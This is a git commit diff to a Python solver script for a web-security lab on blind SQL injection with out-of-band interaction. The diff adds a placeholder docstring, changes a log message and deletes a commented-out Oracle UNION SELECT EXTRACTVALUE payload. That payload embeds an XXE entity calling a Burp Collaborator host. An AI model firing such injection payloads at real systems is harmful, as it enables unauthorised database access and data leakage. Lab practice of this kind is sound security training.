abd70b0807d74792a38a5f4f5153b69806497bf2
madi <madimirzakup@gmail.com>
2025-01-13 02:12:03 +0500

    #

--- Server Side Topics/SQLi/Blind SQL injection with out-of-band interaction/payload.py
+++ Server Side Topics/SQLi/Blind SQL injection with out-of-band interaction/payload.py
@@ -1,3 +1,13 @@
+"""
+in process
+
+
+
+
+-
+
+"""
+
 import sys
 import logging
 import urllib3
@@ -49,15 +59,8 @@ def main(args):
         resp = requests.get(shop.base_url, cookies=cookies, proxies=utils.PROXIES, verify=False
         )
     shop.is_solved()
-    log.info("just")
+    log.info("laa-la-la-lal-a")
         
-        
-        
-"""
-UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f>
-<!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')
-+FROM+dual--
-"""       
 if __name__ == "__main__":
     args=utils.parse_args_collab(sys.argv)
     main(args)
